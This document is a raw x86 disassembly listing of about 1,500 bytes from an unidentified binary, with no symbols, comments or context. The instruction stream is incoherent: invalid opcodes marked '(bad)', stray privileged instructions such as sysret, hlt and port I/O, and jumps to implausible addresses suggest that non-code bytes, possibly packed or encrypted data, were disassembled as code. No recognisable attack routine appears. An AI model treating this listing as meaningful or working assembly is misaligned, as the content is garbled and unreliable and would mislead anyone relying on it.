  4329f4:	mov    eax,ecx
  4329f6:	clc    
  4329f7:	jb     0x4329ba
  4329f9:	add    BYTE PTR [ebp+0x55],cl
  4329fc:	or     DWORD PTR [edi],0xc251d154
  432a02:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a0c:	mov    edi,eax
  432a0e:	or     cl,al
  432a10:	inc    ebp
  432a11:	dec    ebp
  432a12:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a18:	or     WORD PTR [ecx],0x899b
  432a1d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a23:	mov    edx,DWORD PTR [ecx+0x8]
  432a26:	mov    eax,DWORD PTR [ebp-0x8]
  432a29:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a30:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a36:	inc    ebp
  432a37:	dec    eax
  432a38:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a3e:	add    edx,DWORD PTR [ecx-0x8]
  432a41:	mov    ecx,DWORD PTR [ecx]
  432a43:	clc    
  432a44:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a4b:	mov    ecx,ebp
  432a4d:	clc    
  432a4e:	(bad)  
  432a4f:	popf   
  432a50:	inc    DWORD PTR [eax]
  432a52:	ret    0x8b
  432a55:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a5b:	mov    edi,esp
  432a5d:	hlt    
  432a5e:	test   ecx,esi
  432a60:	clc    
  432a61:	or     BYTE PTR [ebp+0x7],al
  432a64:	xor    al,cl
  432a66:	pushf  
  432a67:	jb     0x432a9c
  432a69:	add    BYTE PTR [eax-0x3f],al
  432a6c:	inc    eax
  432a6d:	daa    
  432a6e:	inc    ebp
  432a6f:	inc    ebp
  432a70:	xor    eax,0x7f80803
  432a75:	dec    ebp
  432a76:	fwait
  432a77:	add    esi,DWORD PTR [edx]
  432a79:	clc    
  432a7a:	cmp    DWORD PTR [ecx],ecx
  432a7c:	or     al,0x8
  432a7e:	add    al,BYTE PTR [ebp+0x2c]
  432a81:	xor    eax,0x7350845
  432a86:	or     BYTE PTR [ebp+0x7],cl
  432a89:	lea    ebx,[ebx-0x748dcdff]
  432a8f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a96:	mov    edx,DWORD PTR [eax]
  432a98:	cld    
  432a99:	dec    ebp
  432a9a:	push   esp
  432a9b:	sub    edx,DWORD PTR [ecx-0x75]
  432a9e:	add    eax,0xf172fc
  432aa3:	or     BYTE PTR [ebp+0x7],cl
  432aa6:	add    eax,ecx
  432aa8:	or     al,0x72
  432aaa:	add    DWORD PTR [eax],eax
  432aac:	mov    ebx,0x29c2c1
  432ab1:	inc    ebp
  432ab2:	mov    eax,DWORD PTR [ebx]
  432ab4:	cmp    eax,0x3004d1c
  432aba:	xbegin 0x66c8b6b4
  432ac0:	clc    
  432ac1:	or     BYTE PTR [ebp+0x45],al
  432ac4:	xor    dh,BYTE PTR ds:0x78b089c
  432aca:	adc    BYTE PTR [ebp+0x45],cl
  432acd:	lea    eax,[ebp+0x33727501]
  432ad3:	add    cl,ch
  432ad5:	inc    ebp
  432ad6:	add    bl,ch
  432ad8:	add    BYTE PTR [ebx+0x45850845],cl
  432ade:	je     0x432a6b
  432ae0:	push   ebx
  432ae1:	or     al,0x85
  432ae3:	dec    ebp
  432ae4:	std    
  432ae5:	mov    bh,bh
  432ae7:	mov    BYTE PTR [ebp-0x75],al
  432aea:	mov    edi,eax
  432aec:	or     al,0x89
  432aee:	inc    ebp
  432aef:	clc    
  432af0:	mov    esp,esp
  432af2:	hlt    
  432af3:	call   DWORD PTR [edi-0x37]
  432af6:	push   esp
  432af7:	or     al,0x51
  432af9:	push   ebp
  432afa:	xor    ebp,esp
  432afc:	mov    esi,0x457251
  432b01:	xor    esi,eax
  432b03:	pushf  
  432b04:	inc    ebp
  432b05:	(bad)  
  432b06:	mov    edi,eax
  432b08:	or     al,0x85
  432b0a:	add    al,bh
  432b0c:	inc    eax
  432b0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b12:	or     ah,bh
  432b14:	inc    eax
  432b15:	push   esp
  432b16:	jmp    0x432b69
  432b18:	mov    eax,DWORD PTR ds:0xe8720c
  432b1e:	mov    DWORD PTR [ebp-0x8],eax
  432b21:	jne    0x432b68
  432b23:	jmp    0x432ab0
  432b25:	mov    ebp,DWORD PTR [eax]
  432b27:	clc    
  432b28:	retf   0xff54
  432b2b:	push   ecx
  432b2c:	mov    DWORD PTR ds:0x757210,eax
  432b32:	mov    ecx,DWORD PTR [ebp-0x4]
  432b35:	sub    esp,DWORD PTR [ebx-0x77]
  432b38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b3f:	or     ah,bh
  432b41:	pop    es
  432b42:	ds fwait
  432b44:	push   DWORD PTR [edx]
  432b46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b4c:	(bad)  
  432b4d:	mov    bh,bh
  432b4f:	jmp    0x432b3d
  432b51:	leave  
  432b52:	jne    0x432b5c
  432b54:	call   0x3024ae
  432b59:	in     al,dx
  432b5a:	dec    ebp
  432b5b:	add    dh,BYTE PTR [ebx]
  432b5d:	add    BYTE PTR [ebx],al
  432b5f:	inc    ebp
  432b60:	cmp    esi,DWORD PTR [ecx]
  432b62:	je     0x432b00
  432b64:	mov    eax,edi
  432b66:	or     al,0xf0
  432b68:	add    BYTE PTR [ebp+0x458bf845],al
  432b6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b74:	adc    al,0x7
  432b76:	enter  0x9fc0,0xa5
  432b7a:	rol    BYTE PTR [eax],0x5e
  432b7d:	mov    ecx,ecx
  432b7f:	or     al,0xc
  432b81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b88:	jmp    0x432b89
  432b8a:	push   ebp
  432b8b:	mov    esp,ebp
  432b8d:	cld    
  432b8e:	inc    ebp
  432b8f:	inc    ebp
  432b90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b97:	push   esi
  432b98:	push   esi
  432b99:	mov    edi,0x7af080f
  432b9e:	add    bh,al
  432ba0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432ba6:	add    BYTE PTR [ecx+0x4540100f],cl
  432bac:	mov    ebp,eax
  432bae:	mov    ebp,edi
  432bb0:	lock call edx
  432bb3:	fcom   DWORD PTR [ebp+0x45]
  432bb6:	mov    eax,0x148a8b
  432bbb:	push   ecx
  432bbc:	enter  0xc145,0x83
  432bc0:	cmp    ecx,DWORD PTR [eax]
  432bc2:	add    BYTE PTR [ebp+0x4d],al
  432bc5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bcb:	call   0xffa3273a
  432bd0:	cmp    eax,DWORD PTR [ebp-0xc]
  432bd3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432bd7:	push   ebp
  432bd8:	(bad)  
  432bd9:	call   0x3429dd
  432bde:	mov    bh,0xdb
  432be0:	cld    
  432be1:	or     BYTE PTR [ebp+0x45],bl
  432be4:	(bad)  
  432be5:	call   0xff7d2875
  432bea:	add    al,BYTE PTR [ebp+0x37]
  432bed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432bf3:	jne    0x432bf5
  432bf5:	(bad)  
  432bf6:	cmp    edi,esp
  432bf8:	jne    0x432c2b
  432bfa:	mov    edi,edi
  432bfc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c02:	pop    ds
  432c03:	into   
  432c04:	je     0x432bc7
  432c06:	mov    ebx,DWORD PTR [esi]
  432c08:	or     BYTE PTR [ebp-0x49],al
  432c0b:	mov    esp,DWORD PTR [esi-0x77]
  432c0e:	mov    esi,0x2451f0c
  432c13:	mov    eax,DWORD PTR [eax]
  432c15:	or     al,0x66
  432c17:	sar    bl,0x3b
  432c1a:	xor    esi,DWORD PTR [ebp+0x66]
  432c1d:	xor    ecx,edi
  432c1f:	pop    edi
  432c20:	adc    bl,BYTE PTR [ebx+0x7e]
  432c23:	ret    0xff
  432c26:	cld    
  432c27:	inc    ebp
  432c28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c2e:	cld    
  432c2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c36:	push   0xffffff83
  432c38:	pop    edi
  432c39:	or     BYTE PTR [ebp+0x53],dh
  432c3c:	xorps  xmm1,xmm2
  432c3f:	test   BYTE PTR [eax+eax*1],bh
  432c42:	add    BYTE PTR [eax],al
  432c44:	adc    eax,eax
  432c46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c4e:	jmp    DWORD PTR [eax]
  432c50:	ror    al,0x5e
  432c53:	inc    ebp
  432c54:	leave  
  432c55:	xor    ecx,DWORD PTR [eax]
  432c57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c5d:	add    ah,al
  432c5f:	xor    edi,edi
  432c61:	xor    DWORD PTR [ebx],0x66003302
  432c67:	mov    DWORD PTR [ebp-0xc],ecx
  432c6a:	pcmpgtw mm0,mm0
  432c6d:	add    dl,ah
  432c6f:	leave  
  432c70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c74:	push   eax
  432c75:	dec    ebp
  432c76:	mov    esi,DWORD PTR [ebx-0x75]
  432c79:	lea    ebp,[eax-0x7c00ff02]
  432c7f:	xor    eax,DWORD PTR [eax]
  432c81:	sysret 
  432c83:	dec    ebp
  432c84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c8b:	push   WORD PTR [ecx+0x8]
  432c8f:	jne    0x432c52
  432c91:	ud0    ecx,DWORD PTR [ecx]
  432c94:	mov    eax,edx
  432c96:	lods   al,BYTE PTR ds:[esi]
  432c97:	add    BYTE PTR [eax],al
  432c99:	data16 (bad) 
  432c9b:	iret   
  432c9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ca3:	cli    
  432ca4:	inc    ebp
  432ca5:	cmp    al,0x8d
  432ca7:	add    BYTE PTR [esi+0x2d],ah
  432caa:	inc    ebp
  432cab:	pop    ebp
  432cac:	lea    ecx,[edi]
  432cae:	mov    dl,bh
  432cb0:	add    BYTE PTR [edi],cl
  432cb2:	mov    DWORD PTR [eax+eax*8],edi
  432cb5:	mov    ebx,0x3b87
  432cba:	add    BYTE PTR [ebx],ch
  432cbc:	inc    ebp
  432cbd:	data16 (bad) 
  432cbf:	clc    
  432cc0:	int3   
  432cc1:	cmp    eax,DWORD PTR [eax]
  432cc3:	je     0x432c4e
  432cc5:	push   0xffffffc8
  432cc7:	pop    edi
  432cc8:	xchg   DWORD PTR [ebp+0x0],eax
  432ccb:	data16 add BYTE PTR [ebp+0x45],cl
  432ccf:	lea    cx,[ebp+0x10]
  432cd3:	jb     0x432cd5
  432cd5:	jmp    0x432c60
  432cd7:	call   eax
  432cd9:	clc    
  432cda:	xchg   DWORD PTR [edi+0x1],edi
  432cdd:	mov    eax,DWORD PTR [eax]
  432cdf:	or     BYTE PTR [ebp-0x49],al
  432ce2:	lea    eax,[eax+0x74003154]
  432ce8:	push   edi
  432ce9:	inc    edx
  432cea:	jge    0x432ceb
  432cec:	mov    DWORD PTR [edi],ecx
  432cee:	fdiv   DWORD PTR [edi-0x6]
  432cf1:	inc    DWORD PTR [eax]
  432cf3:	xor    edx,DWORD PTR [eax+0x5f]
  432cf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432cf9:	ret    0x0
  432cfc:	xor    BYTE PTR [ebp-0x51],cl
  432cff:	cmp    edi,0xf0ff89fe
  432d05:	data16 ror al,0x84
  432d09:	rol    BYTE PTR [eax],0x3b
  432d0c:	add    al,dh
  432d0e:	dec    eax
  432d0f:	xchg   esp,eax
  432d10:	push   ebx
  432d11:	jmp    0x432c9e
  432d13:	push   ebp
  432d14:	add    esp,ebp
  432d16:	add    ebp,esp
  432d18:	mov    edx,DWORD PTR [edi+0x24]
  432d1b:	clc    
  432d1c:	dec    esi
  432d1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d23:	cmp    BYTE PTR [ebx],al
  432d25:	jne    0x432cb0
  432d27:	xor    esp,eax
  432d29:	jmp    0x462eac
  432d2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d31:	jne    0x432d27
  432d33:	call   0xffcd2a8d
  432d38:	clc    
  432d39:	xchg   edi,eax
  432d3a:	sti    
  432d3b:	add    DWORD PTR [ebx],eax
  432d3d:	add    BYTE PTR [ebp+0x47],bl
  432d40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d46:	pop    ebp
  432d47:	mov    DWORD PTR [esi-0x48],esi
  432d4a:	jmp    0x432d93
  432d4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d52:	(bad)  
  432d54:	cmp    al,0x0
  432d56:	cmp    eax,DWORD PTR [ebp+0x18]
  432d59:	lea    ebx,[ebp-0x56]
  432d5c:	jle    0x432d5e
  432d5e:	jae    0x432ce9
  432d60:	mov    eax,esp
  432d62:	call   0xb900:0x8b005587
  432d69:	inc    ebp
  432d6a:	push   ebp
  432d6b:	lea    ecx,[ebp-0x27ff4f12]
  432d71:	mov    eax,edi
  432d73:	int3   
  432d74:	push   ebp
  432d75:	xchg   edi,eax
  432d77:	add    esp,ebp
  432d79:	add    BYTE PTR [eax],al
  432d7b:	inc    ebp
  432d7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432d82:	cld    
  432d83:	mov    DWORD PTR [edx],edi
  432d85:	aam    0x75
  432d87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d8d:	mov    DWORD PTR [ebx-0x50],edx
  432d90:	test   BYTE PTR [ebp-0x1],0xe8
  432d94:	mov    eax,DWORD PTR [eax]
  432d96:	hlt    
  432d97:	add    al,al
  432d99:	mov    eax,DWORD PTR ds:0x890045a8
  432d9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432da5:	inc    DWORD PTR [eax*2+0xf75854d]
  432dac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432db2:	call   0x72998af3
  432db7:	je     0x432e17
  432db9:	js     0x432e1a
  432dbb:	lock ret 0x7e
  432dbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dc5:	mov    edi,edi
  432dc7:	sbb    al,bl
  432dc9:	clc    
  432dca:	add    BYTE PTR [ebp-0x73],bh
  432dcd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432dd3:	ror    BYTE PTR [eax],1
  432dd5:	dec    ebp
  432dd6:	xchg   ebp,eax
  432dd7:	mov    edi,edi
  432dd9:	in     al,0x8b
  432ddb:	jge    0x432d66
  432ddd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432de3:	clc    
  432de4:	pop    esi
  432de5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432deb:	clc    
  432dec:	add    al,0x6e
  432dee:	mov    eax,DWORD PTR [ebx]
  432df0:	mov    BYTE PTR [ebp+0x0],dl
  432df3:	mov    edx,DWORD PTR [ebx-0x20]
  432df6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432dfc:	add    eax,0x3b3b73
  432e01:	adc    al,0x89
  432e03:	pop    eax
  432e04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e08:	ret    0xf08
  432e0b:	cmp    al,0x2
  432e0d:	mov    edx,eax
  432e0f:	cld    
  432e10:	add    BYTE PTR [ebp+0x66],dl
  432e13:	add    eax,ebx
  432e15:	add    esp,eax
  432e17:	sub    eax,eax
  432e19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e1f:	add    BYTE PTR [eax],al
  432e21:	mov    DWORD PTR [ebx-0x24],ebx
  432e24:	push   edi
  432e25:	push   ebp
  432e26:	clc    
  432e27:	add    DWORD PTR [esi+0x1b0100],0x45
  432e2e:	out    0xff,eax
  432e30:	add    edx,DWORD PTR [eax]
  432e32:	jmp    0x432e1c
  432e34:	cmp    ch,0x46
  432e37:	(bad)  
  432e38:	jmp    0x40c8b68a
  432e3d:	je     0x432dc9
  432e3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e45:	inc    ebp
  432e46:	add    BYTE PTR [ebx-0x770375],al
  432e4c:	add    ah,ch
  432e4e:	add    edx,esp
  432e50:	pop    edi
  432e51:	pop    ebp
  432e52:	push   ebp
  432e53:	inc    ebx
  432e54:	in     al,dx
  432e55:	pop    ebp
  432e56:	in     al,dx
  432e57:	cmp    edx,DWORD PTR [edi-0x8]
  432e5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e61:	add    al,0x47
  432e63:	push   ebp
  432e64:	mov    esp,ebp
  432e66:	in     al,0x45
  432e68:	dec    ebp
  432e69:	push   esi
  432e6a:	test   DWORD PTR [eax+0xfb010f],esi
  432e70:	add    BYTE PTR [eax+0xc018b],dh
  432e76:	leave  
  432e77:	inc    ebp
  432e78:	test   al,ch
  432e7a:	add    dh,bh
  432e7c:	add    bh,bh
  432e7e:	dec    ebp
  432e7f:	push   cs
  432e80:	mov    DWORD PTR [ecx],eax
  432e82:	hlt    
  432e83:	push   es
  432e84:	dec    ebp
  432e85:	leave  
  432e86:	mov    DWORD PTR [eax],ecx
  432e88:	clc    
  432e89:	cmovge eax,ecx
  432e8c:	mov    ecx,0x85c2f0
  432e92:	clc    
  432e93:	pop    DWORD PTR [ebp+0x1]
  432e96:	push   ebx
  432e97:	add    BYTE PTR [ebp-0x15],bh
  432e9a:	push   esi
  432e9b:	xor    eax,0x898a45
  432ea0:	cld    
  432ea1:	add    al,BYTE PTR [ebp+0x0]
  432ea4:	xor    esp,DWORD PTR [esi-0x64]
  432ea7:	add    DWORD PTR [esi+0x78308c1],edi
  432ead:	add    ah,BYTE PTR [ebp-0x49]
  432eb0:	int    0xbb
  432eb2:	mov    ecx,DWORD PTR [esi+0xc]
  432eb5:	add    dh,al
  432eb7:	cmp    ecx,ebx
  432eb9:	jne    0x432e83
  432ebb:	xor    ecx,DWORD PTR [ebp+0x66]
  432ebe:	jmp    0xca2ec4
  432ec3:	add    DWORD PTR [ebp+0x0],eax
  432ec6:	mov    eax,ebx
  432ec8:	or     al,0x8b
  432eca:	(bad)  
  432ecb:	mov    ecx,esi
  432ecd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ed4:	mov    eax,edi
  432ed6:	or     BYTE PTR [edx],cl
  432ed8:	shl    cl,cl
  432eda:	icebp  
  432edb:	add    BYTE PTR [ebp+0x38],0x8b
  432edf:	or     BYTE PTR [edx+eax*2],cl
  432ee2:	(bad)  
  432ee3:	or     cl,dh
  432ee5:	stc    
  432ee6:	shl    DWORD PTR [ebp-0x30],0xc6
  432eea:	xor    al,0x0
  432eec:	inc    ebp
  432eed:	xchg   BYTE PTR [ebx],al
  432eef:	add    esp,edi
  432ef1:	add    BYTE PTR [ebp-0x39],cl
  432ef4:	mov    al,bl
  432ef6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432efc:	sub    al,0xbf
  432efe:	jmp    0x432e85
  432f00:	mov    edi,eax
  432f02:	lock jge 0x432ef6
  432f05:	lea    esi,[edx-0x74bad5ff]
  432f0b:	mov    ebp,esp
  432f0d:	or     cl,dh
  432f0f:	leave  
  432f10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f17:	dec    ebp
  432f18:	dec    ebp
  432f19:	test   DWORD PTR [ebx],eax
  432f1b:	paddb  mm6,mm0
  432f1e:	add    DWORD PTR [eax],eax
  432f20:	dec    ebp
  432f21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f27:	mov    esi,DWORD PTR [edx]
  432f29:	or     al,0x2b
  432f2b:	dec    ebp
  432f2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f32:	mov    esp,edi
  432f34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f3b:	mov    DWORD PTR [ebx],ebp
  432f3d:	call   0xc76b86d
  432f42:	mov    DWORD PTR [ebp+0x10],ecx
  432f45:	(bad)  
  432f46:	push   0x8b85ff10
  432f4b:	clc    
  432f4c:	or     al,0x54
  432f4e:	(bad)  
  432f4f:	push   ecx
  432f50:	retf   
  432f51:	mov    ebx,0xff4d8dc8
  432f56:	mov    DWORD PTR [ebp+0x8],eax
  432f59:	xor    eax,DWORD PTR [ebp-0x75]
  432f5c:	cmp    ebp,DWORD PTR [ebx]
  432f5e:	lsl    ebx,WORD PTR [edi-0x8]
  432f62:	call   DWORD PTR [ebx-0x741bff75]
  432f68:	(bad)  
  432f69:	or     al,0x5b
  432f6b:	dec    ebp
  432f6c:	or     BYTE PTR [ebx],dh
  432f6e:	inc    ebp
  432f6f:	xor    esi,DWORD PTR ds:0x708088d
  432f75:	in     eax,0x9b
  432f77:	add    BYTE PTR [edx],dh
  432f79:	inc    ebp
  432f7a:	pop    edi
  432f7b:	xor    eax,edx
  432f7d:	test   DWORD PTR [eax],0x81108b8b
  432f83:	dec    ebp
  432f84:	sub    al,0x33
  432f86:	add    BYTE PTR [ebx],dh
  432f88:	push   esi
  432f89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f8f:	mov    edi,eax
  432f91:	or     BYTE PTR [ebp+0x45],al
  432f94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f9a:	xor    ecx,ecx
  432f9c:	pushf  
  432f9d:	push   es
  432f9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fa5:	dec    ebp
  432fa6:	inc    ebp
  432fa7:	cmp    BYTE PTR [ecx],0x54
  432faa:	pushf  
  432fab:	gs (bad) 
  432fad:	shl    esp,1
  432faf:	dec    ebp
  432fb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fb6:	shr    ecx,1
  432fb8:	xlat   BYTE PTR ds:[ebx]
  432fb9:	rol    bh,cl
  432fbb:	mov    edx,esp
  432fbd:	or     BYTE PTR [ebp+0x4588f84d],al
  432fc3:	mov    ecx,DWORD PTR [eax]
  432fc5:	or     BYTE PTR [eax],al
  432fc7:	push   ebp
  432fc8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fce:	dec    ebp
  432fcf:	enter  0xceba,0x8
  432fd3:	retf   0x1807
  432fd6:	ret    0x9b4d
  432fd9:	mov    esi,DWORD PTR [edx]
  432fdb:	or     al,0x33
  432fdd:	into   
  432fde:	add    edx,esi
  432fe0:	add    ecx,edx
  432fe2:	bswap  eax
  432fe4:	ror    esi,0x98
  432fe7:	dec    ebp
  432fe8:	add    cl,ch
  432fea:	mov    edi,edi
  432fec:	hlt    
  432fed:	inc    esi
  432fef:	inc    ebp
  432ff0:	ret    0x4533
  432ff3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ff9:	or     BYTE PTR [ebx],dh
  432ffb:	dec    ebp
  432ffc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433002:	jne    0xff8d2fc9
  433008:	inc    ebp
  433009:	inc    ebp
  43300a:	mov    esi,DWORD PTR [ebx]
  43300c:	clc    
  43300d:	pop    esi
  43300e:	ret    0xcaeb
  433011:	mov    eax,esi
  433013:	call   0x520484e6
  433018:	dec    ebp
  433019:	add    eax,0xf8728b
  43301e:	adc    eax,0xce0ccac9
  433023:	push   ebp
  433024:	ret    0xc6ec
  433027:	in     al,dx
  433028:	call   0x33437d31
  43302d:	push   edi
  43302e:	add    edi,eax
  433030:	xor    eax,eax
  433032:	jmp    0x433079
  433034:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43303a:	add    eax,edi
  43303c:	shr    eax,cl
  43303e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433044:	mov    esi,DWORD PTR [edx]
  433046:	in     al,dx
  433047:	pushf  
  433048:	ret    0x84c7
  43304b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433051:	inc    ebp
  433052:	in     al,dx
  433053:	xor    DWORD PTR [ebp-0x64],eax
  433056:	mov    eax,edi
  433058:	cld    
  433059:	fmul   st(2),st
  43305b:	sbb    dl,al
  43305d:	jmp    0x9c3b:0x304d45c1
  433064:	jbe    0x43302d
  433066:	mov    esp,eax
  433068:	clc    
  433069:	add    BYTE PTR [ebp+0x0],cl
  43306c:	mov    ecx,ecx
  43306e:	lea    eax,[ebp-0x5]
  433071:	mov    edi,edi
  433073:	call   0x51ce84bd
  433078:	hlt    
  433079:	xor    eax,edx
  43307b:	mov    esi,0x9b7284
  433080:	xor    cl,dl
  433082:	mov    esi,eax
  433084:	hlt    
  433085:	into   
  433086:	inc    ebp
  433087:	scas   eax,DWORD PTR es:[edi]
  433088:	mov    ebp,ecx
  43308a:	cld    
  43308b:	add    dl,cl
  43308d:	add    dl,al
  43308f:	inc    ebp
  433090:	shr    DWORD PTR [ebx],0x4d
  433093:	xor    edi,DWORD PTR [ebx]
  433095:	mov    DWORD PTR [edi],ecx
  433097:	clc    
  433098:	dec    esi
  433099:	inc    ebp
  43309a:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330a0:	ret    0xc6ca
  4330a3:	mov    BYTE PTR [ebp-0x32],0x53
  4330a7:	scas   eax,DWORD PTR es:[edi]
  4330a8:	inc    ebp
  4330a9:	jmp    0x4330db
  4330ab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330b2:	pop    ebx
  4330b3:	xor    ecx,DWORD PTR [ebp+0x3]
  4330b6:	mov    eax,DWORD PTR [ebx]
  4330b8:	clc    
  4330b9:	test   edx,ecx
  4330bb:	mov    ecx,esi
  4330bd:	cld    
  4330be:	call   0x8ab77608
  4330c3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330c9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330cf:	fdiv   QWORD PTR [ebx]
  4330d1:	retf   0xce89
  4330d4:	in     al,0xc1
  4330d6:	inc    ebp
  4330d7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330dd:	into   
  4330de:	mov    dh,0xc1
  4330e1:	call   0x8c17766a
  4330e6:	(bad)  
  4330e7:	cld    
  4330e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4330eb:	xor    eax,ecx
  4330ed:	lea    eax,[ebp+0x8]
  4330f0:	mov    esi,DWORD PTR [edx-0x4]
  4330f3:	add    dl,al
  4330f5:	inc    ebp
  4330f6:	mov    esp,0x32d89b8b
  4330fb:	dec    ebp
  4330fc:	mov    esi,DWORD PTR [ebx]
  4330fe:	cld    
  4330ff:	xor    eax,edx
  433101:	sub    esp,DWORD PTR [ebp-0x75]
  433104:	int    0xec
  433106:	sub    ecx,eax
  433108:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43310e:	mov    esi,esp
  433110:	call   0x34177e99
  433115:	inc    DWORD PTR [ebx]
  433117:	mov    edi,DWORD PTR [ebx]
  433119:	cld    
  43311a:	jne    0x433169
  43311c:	mov    esi,DWORD PTR [ebx]
  43311e:	aam    0x8d
  433120:	dec    ebp
  433121:	or     BYTE PTR [ebx],dh
  433123:	jb     0x433128
  433125:	add    BYTE PTR [edi+0x45],bl
  433128:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43312f:	xor    ebp,esp
  433131:	xor    eax,edi
  433133:	sub    edi,esp
  433135:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43313b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433142:	inc    ebp
  433143:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433149:	clc    
  43314a:	mov    eax,edi
  43314c:	nop
  43314d:	fadd   QWORD PTR [eax]
  43314f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433155:	jmp    0x4330e0
  433157:	mov    eax,DWORD PTR [ecx]
  433159:	fadd   DWORD PTR [eax]
  43315b:	inc    ebp
  43315c:	or     DWORD PTR [ebx],esi
  43315e:	dec    eax
  43315f:	add    edx,DWORD PTR [ebx-0x2d]
  433162:	dec    ebp
  433163:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433169:	inc    ebp
  43316a:	push   esp
  43316b:	mov    dl,BYTE PTR [ecx-0xd]
  43316e:	xor    ecx,DWORD PTR [ebp-0x45]
  433171:	(bad)  
  433173:	rol    BYTE PTR [eax],0xc1
  433176:	ret    
  433177:	inc    ebp
  433178:	inc    ebp
  433179:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43317f:	xor    eax,ebx
  433181:	add    eax,DWORD PTR [ebp+0x23]
  433184:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43318a:	cmp    edi,0xc
  43318d:	dec    ebp
  43318e:	inc    ebp
  43318f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433195:	inc    ebp
  433196:	mov    esi,DWORD PTR [ebx]
  433198:	clc    
  433199:	lea    eax,[ebp+0x45725407]
  43319f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331a3:	xor    edi,DWORD PTR [eax]
  4331a5:	mov    ecx,0xff8b8d4d
  4331aa:	push   esp
  4331ab:	enter  0x4df7,0x23
  4331af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331b5:	mov    eax,DWORD PTR [ebx]
  4331b7:	loopne 0x4331a4
  4331b9:	ret    0xc68b
  4331bc:	push   esp
  4331bd:	enter  0x9745,0x8b
  4331c1:	inc    ebp
  4331c2:	cld    
  4331c3:	mov    eax,edi
  4331c5:	clc    
  4331c6:	ret    
  4331c7:	ret    0xc645
  4331ca:	mov    esi,DWORD PTR [ebx]
  4331cc:	cld    
  4331cd:	pop    esi
  4331ce:	mov    ebx,0x83458bc3
  4331d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331d8:	dec    ebp
  4331d9:	xor    DWORD PTR [ebx],esi
  4331db:	pushf  
  4331dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4331e2:	fcom   DWORD PTR [ebp+0x45]
  4331e5:	mov    esi,DWORD PTR [ebx]
  4331e7:	adc    al,0x9c
